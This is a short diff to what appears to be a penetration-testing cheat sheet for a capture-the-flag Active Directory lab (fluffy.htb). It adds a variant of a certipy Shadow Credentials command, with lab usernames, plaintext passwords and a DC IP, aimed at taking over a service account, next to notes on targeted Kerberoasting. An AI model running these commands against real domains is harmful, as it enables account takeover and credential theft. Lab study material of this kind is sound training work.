@@ -885,6 +885,8 @@ certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
 
 # Shadow Credential  (  p.agila need have GenericWrite over winrm_svc , can targeted Kerberoast (give the user a SPN, get a hash, and try to break it to get their password))
 certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
+or
+certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc -dc-ip 10.129.6.201 -scheme ldap
 
 ```
 ## bloodyAD
